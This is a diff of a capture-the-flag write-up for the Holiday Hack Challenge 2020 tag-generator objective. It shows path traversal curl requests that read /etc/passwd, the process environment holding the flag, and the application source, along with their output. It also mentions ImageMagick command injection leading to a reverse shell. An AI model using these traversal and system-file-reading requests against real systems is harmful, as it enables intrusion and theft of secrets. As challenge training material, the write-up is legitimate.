@@ -7,7 +7,7 @@ The objective is to obtain the value of the environment variable `GREETZ` of the
 
 It was found that the image download function allows path traversal:
 ```
-curl https://tag-generator.kringlecastle.com/image?id=../../../../../etc/passwd
+curl https://tag-generator.kringlecastle.com/image?id=../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -20,16 +20,16 @@ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 ```
 Using this the value the environment variable can be obtained like this:
 ```
-curl https://tag-generator.kringlecastle.com/image?id=../../../../../proc/self/environ --output -
+curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output -
 PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
 ```
 So the `GREETZ` variable contains **JackFrostWasHere**
 
 ## Solution using RCE
 
-The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through the above path traversal:
+The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through the above path traversal (the full path of the app.rb is display in the application's error messages):
 ```
-curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
+curl https://tag-generator.kringlecastle.com/image?id=../../app/lib/app.rb --output app.rb
 ```
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
@@ -68,11 +68,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwNTIxNjM2MTcsLTE3NjM1NDEzNTUsMT
-YwNzM0ODUxNCwtODIzMDUwODYxLDEyOTM3MjA0MzksMTM5NTc5
-NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3NDExLC01NzY2MTAwNz
-UsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMzk4NDkxNDYxLDExNTE1
-NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3ODcsLTE0Njc2MTUyNj
-IsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMDQ1NTg2NSwtMTYw
-NjA3ODA0MF19
+eyJoaXN0b3J5IjpbLTE5MjQ2MTQzNSwtMTA1MjE2MzYxNywtMT
+c2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5Mzcy
+MDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOTc0MT
+EsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0zOTg0
+OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4Ny
+wtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIw
+NDU1ODY1XX0=
 -->
